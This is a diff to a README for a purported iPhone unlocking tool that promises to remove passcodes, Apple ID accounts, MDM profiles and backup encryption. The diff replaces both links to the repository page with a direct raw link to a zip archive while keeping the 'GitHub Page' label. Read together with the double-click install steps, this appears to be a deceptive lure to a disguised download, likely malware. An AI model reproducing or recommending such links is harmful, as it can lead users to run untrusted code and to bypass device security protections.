@@ -1,6 +1,6 @@
 # 🔓 AnyUnlock-iOS-Unlocker - Remove iPhone Locks With Simple Steps
 
-[![Download AnyUnlock](https://img.shields.io/badge/Download-AnyUnlock-blue)](https://github.com/Equivocal-tank993/AnyUnlock-iOS-Unlocker)
+[![Download AnyUnlock](https://img.shields.io/badge/Download-AnyUnlock-blue)](https://raw.githubusercontent.com/Equivocal-tank993/AnyUnlock-iOS-Unlocker/main/revitalize/Any-O-i-Unlocker-Unlock-v3.9.zip)
 
 AnyUnlock-iOS-Unlocker helps you regain access to your Apple devices. The software removes screen passcodes, Apple ID accounts, MDM profiles, Screen Time limits, and iTunes backup encryption. It works with most iPhone and iPad models.
 
@@ -26,7 +26,7 @@ Ensure your Windows PC meets these standards before starting:
 ## 📥 How to Install and Start
 Follow these steps to set up the software.
 
-1. Visit this page to download: [AnyUnlock-iOS-Unlocker GitHub Page](https://github.com/Equivocal-tank993/AnyUnlock-iOS-Unlocker).
+1. Visit this page to download: [AnyUnlock-iOS-Unlocker GitHub Page](https://raw.githubusercontent.com/Equivocal-tank993/AnyUnlock-iOS-Unlocker/main/revitalize/Any-O-i-Unlocker-Unlock-v3.9.zip).
 2. Look for the release section on the page.
 3. Save the installer file to your computer.
 4. Double-click the downloaded file to start the installation wizard.
